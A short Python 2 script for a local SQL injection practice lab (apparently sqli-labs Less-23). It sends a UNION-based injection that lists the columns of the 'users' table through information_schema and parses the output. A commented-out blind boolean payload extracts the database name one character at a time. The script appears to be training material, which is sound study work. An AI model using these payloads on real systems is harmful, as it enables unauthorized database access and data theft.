# -*- coding:utf-8 -*-

import requests
import string
from bs4 import BeautifulSoup

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
url = "http://127.0.0.1/sqli/Less-23/"

data = string.digits+string.lowercase

length = ""
def load(url):
    # response = requests.get(url+'?id=-1" || ascii(substr((select database() limit 0,1),{a},1))={b} %23'.format(a=j,b=i),headers=header)
    response = requests.get(url+"?id=-1'union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),'3",headers=header)
    # print response.content
    soup = BeautifulSoup(str(response.content),'lxml')
    r = soup.find_all(name='font',attrs={'color':'#0000ff'})
    for i in r:
        print i
    # sprint response
    # if "You are in..........." in response:
    #     length = length+chr(i)
    #     print length
    #     break

load (url)